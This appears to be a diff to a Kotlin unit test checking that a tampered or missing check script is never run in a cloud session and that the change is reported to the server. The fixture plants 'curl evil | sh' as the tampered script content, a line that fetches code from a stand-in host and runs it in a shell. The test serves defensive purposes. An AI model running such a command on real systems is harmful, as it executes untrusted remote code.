@@ -525,19 +525,16 @@ class PackageChecksTest {
     }
 
     @Test
-    fun inACloudSessionAChangedScriptGoesToTheRunnerAndIsRefused() {
+    fun inACloudSessionAChangedOrMissingScriptIsSentNowhere() {
         runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
         val checks = checks(listOf(tests))
         texts["/t/scripts/s-test.sh"] = "curl evil | sh\n"
-        assertEquals(
-            "Ostrom: check \"Tests\" could not run (script s-test is not the package's), so the action was not run.\n",
-            checks.before("git push origin main")?.stderr,
-            "refused whatever the runner answered",
-        )
-        assertEquals("curl evil | sh\n", runner?.checks?.single()?.script, "the runner records it as tampered")
+        assertContains(checks.before("git push origin main")?.stderr.orEmpty(), "was changed on this machine")
+        assertEquals(sha("curl evil | sh\n"), reports().single().text("scriptSha"), "the server sees the change")
         texts.remove("/t/scripts/s-test.sh")
         assertContains(checks.before("git push origin main")?.stderr.orEmpty(), "(script s-test is missing)")
-        assertEquals(1, runner?.checks?.size, "nothing to send: refused and reported here as not run")
-        assertEquals("not run", reports().single().text("sandbox"))
+        assertEquals(listOf("not run", "not run"), reports().map { it.text("sandbox") })
+        assertEquals(emptyList(), runner?.checks, "never run, not even on the runner's host")
+        assertEquals(emptyList(), scripts.requests)
     }
 }
